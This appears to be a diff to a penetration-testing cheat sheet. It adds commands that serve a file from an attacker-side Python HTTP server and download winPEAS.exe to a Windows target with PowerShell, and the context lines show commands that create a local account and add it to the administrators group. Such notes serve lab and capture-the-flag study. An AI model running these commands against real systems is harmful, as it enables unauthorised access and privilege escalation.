@@ -499,6 +499,10 @@ Output file contents:
 - add own account: `net user <username> <password> /add`
 - add account to admin group: `net localgroup administrators <username> /add`
 
+## Upload file to target
+- `sudo python -m http.server 80`
+- `powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.9.222.201:80/winPEAS.exe','C:\Users\bill\Desktop\winPEAS.exe')`
+
 ## Windows Privesc
 - examples work on Windows 10
 
